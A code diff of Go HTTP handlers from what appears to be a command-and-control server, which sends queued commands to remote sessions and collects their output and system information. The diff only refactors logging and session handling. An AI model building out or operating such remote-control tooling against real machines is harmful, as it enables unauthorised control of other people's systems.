@@ -28,7 +28,6 @@ func GetCmd(w http.ResponseWriter, req *http.Request) {
 		} else {
 			cli.Printf("[+] Got request for cmd from session id: %d\n", index)
 
-			// Set session as open
 			sessionObj.Open = true
 
 			var command string
@@ -39,7 +38,12 @@ func GetCmd(w http.ResponseWriter, req *http.Request) {
 					command = str
 					fmt.Fprintf(w, command)
 				case <-req.Context().Done():
+					// get session again for concurrency safety
+					index, _ := CreateSession(req)
+					sessionObj, _ := GetSession(index)
+
 					cli.Print(cfmt.Sprintf("{{[-] Connection closed from session: %d\n}}::red", index))
+
 					sessionObj.Open = false
 					w.WriteHeader(444) // 444 - Connection Closed Without Response
 				}
@@ -65,11 +69,9 @@ func CmdOutput(w http.ResponseWriter, req *http.Request) {
 			return
 		}
 
-		index := FindSessionIndexByToken(req.Header.Get("Token"))
-
 		// close connection, the client will open a new one
 		w.Header().Set("Connection", "close")
-		cli.Printf("[+] Got response from session id %d:\n%s\n", index, body)
+		cli.Printf("[+] Got response from session id %d:\n%s\n", FindSessionIndexByToken(req.Header.Get("token")), body)
 		fmt.Fprintf(w, "Successfully posted output")
 	}
 }
@@ -153,7 +155,6 @@ func GetSysinfo(w http.ResponseWriter, req *http.Request) {
 			cli.Printf("[-] Error while getting session from token: %s\n", ErrUnrecognizedSessionToken)
 			return
 		}
-		cli.Println("[+] Got system information from session: ", index)
 		body, _ := ioutil.ReadAll(req.Body)
 		defer req.Body.Close()
 
